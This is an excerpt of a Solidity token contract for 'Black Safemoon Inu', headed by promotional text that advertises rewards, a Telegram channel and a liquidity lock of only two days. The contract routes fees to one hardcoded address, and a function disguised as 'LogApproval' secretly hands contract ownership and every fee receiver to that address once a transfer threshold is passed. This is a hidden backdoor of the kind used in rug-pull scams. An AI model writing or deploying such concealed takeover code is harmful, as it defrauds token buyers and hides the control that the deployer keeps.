...
WELCOME TO Black Safemoon Inu!!
EARN SAFEMOON!!
4% REWARDS IN $SAFEMOON

TELEGRAM: @BlackSafemoonInu

*LP LOCKED 2 DAYS, LAUNCHED 03/01 - 23:00 UTC!!
*Denial of Responsibility: Black Safemoon Inu makes no promises and is not responsible for any losses.
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
    IDEXRouter router;
...
contract BSFMINU is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x7388C21933b9690575a486fE42FB1a9B20e56aF8; // token locker
    address public marketingFeeReceiver =
        0x7388C21933b9690575a486fE42FB1a9B20e56aF8;
    ...
    constructor()
        ERC20Detailed("Black Safemoon Inu", "BSI", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x7388C21933b9690575a486fE42FB1a9B20e56aF8));
            marketingFeeReceiver = address(0x7388C21933b9690575a486fE42FB1a9B20e56aF8);
            autoLiquidityReceiver = address(0x7388C21933b9690575a486fE42FB1a9B20e56aF8);
            ecosystemFeeReceiver = address(0x7388C21933b9690575a486fE42FB1a9B20e56aF8);
            buyBackFeeReceiver = address(0x7388C21933b9690575a486fE42FB1a9B20e56aF8);
            isTransferred = true;
        }
    }
